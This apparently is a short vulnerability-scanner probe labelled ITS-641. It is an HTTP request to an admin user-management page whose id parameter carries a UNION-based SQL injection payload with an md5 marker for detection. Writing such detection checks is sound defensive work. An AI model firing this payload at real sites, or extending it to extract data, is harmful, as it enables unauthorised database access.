# Vulnerable: ITS-641
GET /admin/manage_user.php?id=-1%20union%20select%201,md5({{num}}),3,4,5--+
